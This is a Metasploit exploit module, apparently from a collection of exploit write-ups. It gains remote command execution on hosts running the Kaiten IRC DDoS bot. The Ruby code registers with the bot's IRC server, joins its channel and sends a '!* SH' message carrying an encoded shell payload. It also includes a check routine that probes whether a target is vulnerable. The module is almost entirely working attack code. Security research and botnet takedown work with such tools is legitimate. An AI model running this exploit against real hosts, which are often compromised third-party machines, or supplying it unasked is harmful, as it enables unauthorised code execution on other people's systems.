#### kaiten

Type: Remote Code Execution

Author: [shipcod3 / Jay Turla](https://twitter.com/shipcod3)

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Kaiten DDoS IRC Bot  Remote Code Execution',
      'Description'    => %q{
          This module exploits the remote command execution vulnerability on the kaiten IRC Bot.
          kaiten is a known IRC based distributed denial of service client which accepts commands
          through its administrator via IRC.
        },
      'Author'         =>
        [
          'Jay Turla'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/shellshock-vulnerability-downloads-kaiten-source-code/' ],
          [ 'URL', 'http://blog.malwaremustdie.org/2013/05/story-of-unix-trojan-tsunami-ircbot-w.html' ] #MalwareMustDie
        ],
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
            }
        },
      'Targets'  =>
        [
          [ 'kaiten', { } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 16 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(6667),
        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),
        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),
        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])
      ], self.class)
  end

  def check
    connect

    response = register(sock)
    if response =~ /463/ or response =~ /464/
      vprint_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
      return Exploit::CheckCode::Unknown
    end

    response = join(sock)
    if not response =~ /353/ and not response =~ /366/
      vprint_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
      return Exploit::CheckCode::Unknown
    end

    quit(sock)
    disconnect

    if response =~ /auth/ and response =~ /logged in/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def send_msg(sock, data)
    sock.put(data)
    data = ""
    begin
      read_data = sock.get_once(-1, 1)
      while not read_data.nil?
        data << read_data
        read_data = sock.get_once(-1, 1)
      end
    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    data
  end

  def register(sock)
    msg = ""

    if datastore['IRC_PASSWORD'] and not datastore['IRC_PASSWORD'].empty?
      msg << "PASS #{datastore['IRC_PASSWORD']}\r\n"
    end

    if datastore['NICK'].length > 9
      nick = rand_text_alpha(9)
      print_error("The nick is longer than 9 characters, using #{nick}")
    else
      nick = datastore['NICK']
    end

    msg << "NICK #{nick}\r\n"
    msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"

    response = send_msg(sock,msg)
    return response
  end

  def join(sock)
    join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
    response = send_msg(sock, join_msg)
    return response
  end

  def kaiten_command(sock)
    encoded = payload.encoded
    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!* SH #{encoded}\r\n"
    response = send_msg(sock, command_msg)
    return response
  end

  def quit(sock)
    quit_msg = "QUIT :bye bye\r\n"
    sock.put(quit_msg)
  end

  def exploit
    connect

    print_status("#{peer} - Registering with the IRC Server...")
    response = register(sock)
    if response =~ /463/ or response =~ /464/
      print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
      return
    end

    print_status("#{peer} - Joining the #{datastore['CHANNEL']} channel...")
    response = join(sock)
    if not response =~ /353/ and not response =~ /366/
      print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
      return
    end

    print_status("#{peer} - Exploiting the kaiten IRC bot...")
    kaiten_command(sock)

    quit(sock)
    disconnect
  end
end
```
